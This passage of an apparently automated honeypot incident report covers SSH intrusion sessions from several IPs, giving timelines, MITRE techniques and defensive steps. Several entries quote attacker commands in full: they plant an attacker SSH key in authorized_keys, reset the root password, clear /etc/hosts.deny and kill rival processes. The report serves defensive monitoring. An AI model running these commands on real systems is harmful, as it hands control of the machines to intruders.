| **Last Seen** | 2026-06-14 10:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:47:08` | `cowrie.session.connect` |
| `2026-06-14 10:47:08` | `cowrie.client.version` |
| `2026-06-14 10:47:09` | `cowrie.client.kex` |
| `2026-06-14 10:47:12` | `cowrie.login.success` |
| `2026-06-14 10:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.227.213[.]228` to AbuseIPDB if not already reported
- [ ] Block `192.227.213[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19dd1cb63d32

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]150` |
| **First Seen** | 2026-06-14 10:48 |
| **Last Seen** | 2026-06-14 10:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:48:38` | `cowrie.session.connect` |
| `2026-06-14 10:48:38` | `cowrie.client.version` |
| `2026-06-14 10:48:38` | `cowrie.client.kex` |
| `2026-06-14 10:48:38` | `cowrie.login.success` |
| `2026-06-14 10:48:38` | `cowrie.session.params` |
| `2026-06-14 10:48:38` | `cowrie.command.input` |
| `2026-06-14 10:48:38` | `cowrie.command.failed` |
| `2026-06-14 10:48:38` | `cowrie.log.closed` |
| `2026-06-14 10:48:38` | `cowrie.session.params` |
| `2026-06-14 10:48:38` | `cowrie.command.input` |
| `2026-06-14 10:48:38` | `cowrie.session.file_download` |
| `2026-06-14 10:48:38` | `cowrie.log.closed` |
| `2026-06-14 10:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2483dfc9e83

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]150` |
| **First Seen** | 2026-06-14 10:48 |
| **Last Seen** | 2026-06-14 10:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:48:40` | `cowrie.session.connect` |
| `2026-06-14 10:48:40` | `cowrie.client.version` |
| `2026-06-14 10:48:40` | `cowrie.client.kex` |
| `2026-06-14 10:48:40` | `cowrie.login.success` |
| `2026-06-14 10:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69f1f06f0f05

| Field | Detail |
|---|---|
| **Source IP** | `192.227.213[.]228` |
| **First Seen** | 2026-06-14 11:11 |
| **Last Seen** | 2026-06-14 11:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:11:23` | `cowrie.session.connect` |
| `2026-06-14 11:11:23` | `cowrie.client.version` |
| `2026-06-14 11:11:24` | `cowrie.client.kex` |
| `2026-06-14 11:11:25` | `cowrie.login.success` |
| `2026-06-14 11:11:25` | `cowrie.session.params` |
| `2026-06-14 11:11:25` | `cowrie.command.input` |
| `2026-06-14 11:11:25` | `cowrie.command.failed` |
| `2026-06-14 11:11:26` | `cowrie.log.closed` |
| `2026-06-14 11:11:26` | `cowrie.session.params` |
| `2026-06-14 11:11:26` | `cowrie.command.input` |
| `2026-06-14 11:11:27` | `cowrie.session.file_download` |
| `2026-06-14 11:11:27` | `cowrie.log.closed` |
| `2026-06-14 11:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.227.213[.]228` to AbuseIPDB if not already reported
- [ ] Block `192.227.213[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73784a6b0b03

| Field | Detail |
|---|---|
| **Source IP** | `192.227.213[.]228` |
| **First Seen** | 2026-06-14 11:11 |
| **Last Seen** | 2026-06-14 11:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:11:31` | `cowrie.session.connect` |
| `2026-06-14 11:11:31` | `cowrie.client.version` |
| `2026-06-14 11:11:31` | `cowrie.client.kex` |
| `2026-06-14 11:11:33` | `cowrie.login.success` |
| `2026-06-14 11:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.227.213[.]228` to AbuseIPDB if not already reported
- [ ] Block `192.227.213[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8dda18a3e6b

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:41 |
| **Last Seen** | 2026-06-14 11:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:41:22` | `cowrie.session.connect` |
| `2026-06-14 11:41:22` | `cowrie.client.version` |
| `2026-06-14 11:41:22` | `cowrie.client.kex` |
| `2026-06-14 11:41:22` | `cowrie.login.success` |
| `2026-06-14 11:41:22` | `cowrie.session.params` |
| `2026-06-14 11:41:22` | `cowrie.command.input` |
| `2026-06-14 11:41:22` | `cowrie.command.failed` |
| `2026-06-14 11:41:22` | `cowrie.log.closed` |
| `2026-06-14 11:41:23` | `cowrie.session.params` |
| `2026-06-14 11:41:23` | `cowrie.command.input` |
| `2026-06-14 11:41:23` | `cowrie.session.file_download` |
| `2026-06-14 11:41:23` | `cowrie.log.closed` |
| `2026-06-14 11:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7585612b2846

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:41 |
| **Last Seen** | 2026-06-14 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:41:24` | `cowrie.session.connect` |
| `2026-06-14 11:41:24` | `cowrie.client.version` |
| `2026-06-14 11:41:24` | `cowrie.client.kex` |
| `2026-06-14 11:41:24` | `cowrie.login.success` |
| `2026-06-14 11:41:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94837dfb7cfc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.123[.]232` |
| **First Seen** | 2026-06-14 11:43 |
| **Last Seen** | 2026-06-14 11:43 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GkEyZxguSxTv"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:43:00` | `cowrie.session.connect` |
| `2026-06-14 11:43:00` | `cowrie.client.version` |
| `2026-06-14 11:43:00` | `cowrie.client.kex` |
| `2026-06-14 11:43:01` | `cowrie.login.success` |
| `2026-06-14 11:43:01` | `cowrie.session.params` |
| `2026-06-14 11:43:01` | `cowrie.command.input` |
| `2026-06-14 11:43:01` | `cowrie.command.failed` |
| `2026-06-14 11:43:01` | `cowrie.log.closed` |
| `2026-06-14 11:43:01` | `cowrie.session.params` |
| `2026-06-14 11:43:01` | `cowrie.command.input` |
| `2026-06-14 11:43:02` | `cowrie.session.file_download` |
| `2026-06-14 11:43:02` | `cowrie.log.closed` |
| `2026-06-14 11:43:18` | `cowrie.session.params` |
| `2026-06-14 11:43:18` | `cowrie.command.input` |
| `2026-06-14 11:43:18` | `cowrie.log.closed` |
| `2026-06-14 11:43:18` | `cowrie.session.params` |
| `2026-06-14 11:43:18` | `cowrie.command.input` |
| `2026-06-14 11:43:18` | `cowrie.log.closed` |
| `2026-06-14 11:43:19` | `cowrie.session.params` |
| `2026-06-14 11:43:19` | `cowrie.command.input` |
| `2026-06-14 11:43:19` | `cowrie.session.file_download` |
| `2026-06-14 11:43:19` | `cowrie.log.closed` |
| `2026-06-14 11:43:19` | `cowrie.session.params` |
| `2026-06-14 11:43:19` | `cowrie.command.input` |
| `2026-06-14 11:43:19` | `cowrie.log.closed` |
| `2026-06-14 11:43:20` | `cowrie.session.params` |
| `2026-06-14 11:43:20` | `cowrie.command.input` |
| `2026-06-14 11:43:20` | `cowrie.log.closed` |
| `2026-06-14 11:43:20` | `cowrie.session.params` |
| `2026-06-14 11:43:20` | `cowrie.command.input` |
| `2026-06-14 11:43:20` | `cowrie.command.input` |
| `2026-06-14 11:43:20` | `cowrie.log.closed` |
| `2026-06-14 11:43:21` | `cowrie.session.params` |
| `2026-06-14 11:43:21` | `cowrie.command.input` |
| `2026-06-14 11:43:21` | `cowrie.log.closed` |
| `2026-06-14 11:43:21` | `cowrie.session.params` |
| `2026-06-14 11:43:21` | `cowrie.command.input` |
| `2026-06-14 11:43:21` | `cowrie.log.closed` |
| `2026-06-14 11:43:22` | `cowrie.session.params` |
| `2026-06-14 11:43:22` | `cowrie.command.input` |
| `2026-06-14 11:43:23` | `cowrie.log.closed` |
| `2026-06-14 11:43:23` | `cowrie.session.params` |
| `2026-06-14 11:43:23` | `cowrie.command.input` |
| `2026-06-14 11:43:23` | `cowrie.log.closed` |
| `2026-06-14 11:43:23` | `cowrie.session.params` |
| `2026-06-14 11:43:23` | `cowrie.command.input` |
| `2026-06-14 11:43:24` | `cowrie.log.closed` |
| `2026-06-14 11:43:24` | `cowrie.session.params` |
| `2026-06-14 11:43:24` | `cowrie.command.input` |
| `2026-06-14 11:43:24` | `cowrie.log.closed` |
| `2026-06-14 11:43:25` | `cowrie.session.params` |
| `2026-06-14 11:43:25` | `cowrie.command.input` |
| `2026-06-14 11:43:25` | `cowrie.log.closed` |
| `2026-06-14 11:43:25` | `cowrie.session.params` |
| `2026-06-14 11:43:25` | `cowrie.command.input` |
| `2026-06-14 11:43:25` | `cowrie.log.closed` |
| `2026-06-14 11:43:26` | `cowrie.session.params` |
| `2026-06-14 11:43:26` | `cowrie.command.input` |
| `2026-06-14 11:43:26` | `cowrie.log.closed` |
| `2026-06-14 11:43:26` | `cowrie.session.params` |
| `2026-06-14 11:43:26` | `cowrie.command.input` |
| `2026-06-14 11:43:26` | `cowrie.log.closed` |
| `2026-06-14 11:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.123[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.123[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c52d7a64a6f

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:43 |
| **Last Seen** | 2026-06-14 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:43:31` | `cowrie.session.connect` |
| `2026-06-14 11:43:31` | `cowrie.client.version` |
| `2026-06-14 11:43:31` | `cowrie.client.kex` |
| `2026-06-14 11:43:32` | `cowrie.login.success` |
| `2026-06-14 11:43:32` | `cowrie.session.params` |
| `2026-06-14 11:43:32` | `cowrie.command.input` |
| `2026-06-14 11:43:32` | `cowrie.command.failed` |
| `2026-06-14 11:43:32` | `cowrie.log.closed` |
| `2026-06-14 11:43:32` | `cowrie.session.params` |
| `2026-06-14 11:43:32` | `cowrie.command.input` |
| `2026-06-14 11:43:32` | `cowrie.session.file_download` |
| `2026-06-14 11:43:32` | `cowrie.log.closed` |
| `2026-06-14 11:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79fea5d3dc86

| Field | Detail |
|---|---|
| **Source IP** | `167.172.93[.]203` |
| **First Seen** | 2026-06-14 11:43 |
| **Last Seen** | 2026-06-14 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:43:34` | `cowrie.session.connect` |
| `2026-06-14 11:43:34` | `cowrie.client.version` |
| `2026-06-14 11:43:34` | `cowrie.client.kex` |
| `2026-06-14 11:43:34` | `cowrie.login.success` |
| `2026-06-14 11:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.172.93[.]203` to AbuseIPDB if not already reported
- [ ] Block `167.172.93[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6ad4bf3e545

| Field | Detail |
|---|---|
| **Source IP** | `42.51.33[.]162` |
| **First Seen** | 2026-06-14 11:45 |
| **Last Seen** | 2026-06-14 11:45 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:mEg6ciWCgOCm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:45:02` | `cowrie.session.connect` |
| `2026-06-14 11:45:03` | `cowrie.client.version` |
| `2026-06-14 11:45:03` | `cowrie.client.kex` |
| `2026-06-14 11:45:03` | `cowrie.login.success` |
| `2026-06-14 11:45:04` | `cowrie.session.params` |
| `2026-06-14 11:45:04` | `cowrie.command.input` |
| `2026-06-14 11:45:04` | `cowrie.command.failed` |
| `2026-06-14 11:45:04` | `cowrie.log.closed` |
| `2026-06-14 11:45:04` | `cowrie.session.params` |
| `2026-06-14 11:45:04` | `cowrie.command.input` |
| `2026-06-14 11:45:04` | `cowrie.session.file_download` |
| `2026-06-14 11:45:04` | `cowrie.log.closed` |
| `2026-06-14 11:45:21` | `cowrie.session.params` |
| `2026-06-14 11:45:21` | `cowrie.command.input` |
| `2026-06-14 11:45:21` | `cowrie.log.closed` |
| `2026-06-14 11:45:21` | `cowrie.session.params` |
| `2026-06-14 11:45:21` | `cowrie.command.input` |
| `2026-06-14 11:45:21` | `cowrie.log.closed` |
| `2026-06-14 11:45:22` | `cowrie.session.params` |
| `2026-06-14 11:45:22` | `cowrie.command.input` |
| `2026-06-14 11:45:22` | `cowrie.session.file_download` |
| `2026-06-14 11:45:22` | `cowrie.log.closed` |
| `2026-06-14 11:45:22` | `cowrie.session.params` |
| `2026-06-14 11:45:22` | `cowrie.command.input` |
| `2026-06-14 11:45:22` | `cowrie.log.closed` |
| `2026-06-14 11:45:23` | `cowrie.session.params` |
| `2026-06-14 11:45:23` | `cowrie.command.input` |
| `2026-06-14 11:45:23` | `cowrie.log.closed` |
| `2026-06-14 11:45:23` | `cowrie.session.params` |
| `2026-06-14 11:45:23` | `cowrie.command.input` |
| `2026-06-14 11:45:23` | `cowrie.command.input` |
| `2026-06-14 11:45:23` | `cowrie.log.closed` |
| `2026-06-14 11:45:24` | `cowrie.session.params` |
| `2026-06-14 11:45:24` | `cowrie.command.input` |
| `2026-06-14 11:45:24` | `cowrie.log.closed` |
| `2026-06-14 11:45:24` | `cowrie.session.params` |
| `2026-06-14 11:45:24` | `cowrie.command.input` |
| `2026-06-14 11:45:24` | `cowrie.log.closed` |
| `2026-06-14 11:45:25` | `cowrie.session.params` |
| `2026-06-14 11:45:25` | `cowrie.command.input` |
| `2026-06-14 11:45:25` | `cowrie.log.closed` |
| `2026-06-14 11:45:25` | `cowrie.session.params` |
| `2026-06-14 11:45:25` | `cowrie.command.input` |
| `2026-06-14 11:45:25` | `cowrie.log.closed` |
| `2026-06-14 11:45:26` | `cowrie.session.params` |
| `2026-06-14 11:45:26` | `cowrie.command.input` |
| `2026-06-14 11:45:26` | `cowrie.log.closed` |
| `2026-06-14 11:45:26` | `cowrie.session.params` |
| `2026-06-14 11:45:26` | `cowrie.command.input` |
| `2026-06-14 11:45:26` | `cowrie.log.closed` |
| `2026-06-14 11:45:27` | `cowrie.session.params` |
| `2026-06-14 11:45:27` | `cowrie.command.input` |
| `2026-06-14 11:45:27` | `cowrie.log.closed` |
| `2026-06-14 11:45:27` | `cowrie.session.params` |
| `2026-06-14 11:45:27` | `cowrie.command.input` |
| `2026-06-14 11:45:27` | `cowrie.log.closed` |
| `2026-06-14 11:45:28` | `cowrie.session.params` |
| `2026-06-14 11:45:28` | `cowrie.command.input` |
| `2026-06-14 11:45:28` | `cowrie.log.closed` |
| `2026-06-14 11:45:28` | `cowrie.session.params` |
| `2026-06-14 11:45:28` | `cowrie.command.input` |
| `2026-06-14 11:45:28` | `cowrie.log.closed` |
| `2026-06-14 11:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.33[.]162` to AbuseIPDB if not already reported
- [ ] Block `42.51.33[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499b7a0d782f

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-06-14 11:51 |
| **Last Seen** | 2026-06-14 11:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:51:08` | `cowrie.session.connect` |
| `2026-06-14 11:51:08` | `cowrie.client.version` |
| `2026-06-14 11:51:08` | `cowrie.client.kex` |
| `2026-06-14 11:51:09` | `cowrie.login.success` |
| `2026-06-14 11:51:09` | `cowrie.session.params` |
| `2026-06-14 11:51:09` | `cowrie.command.input` |
| `2026-06-14 11:51:09` | `cowrie.command.failed` |
| `2026-06-14 11:51:09` | `cowrie.log.closed` |
| `2026-06-14 11:51:09` | `cowrie.session.params` |
| `2026-06-14 11:51:09` | `cowrie.command.input` |
| `2026-06-14 11:51:09` | `cowrie.session.file_download` |
| `2026-06-14 11:51:09` | `cowrie.log.closed` |
| `2026-06-14 11:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.234[.]96` to AbuseIPDB if not already reported
- [ ] Block `103.189.234[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c82f85b1f230

| Field | Detail |
|---|---|
| **Source IP** | `103.189.234[.]96` |
| **First Seen** | 2026-06-14 11:51 |
| **Last Seen** | 2026-06-14 11:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 11:51:11` | `cowrie.session.connect` |
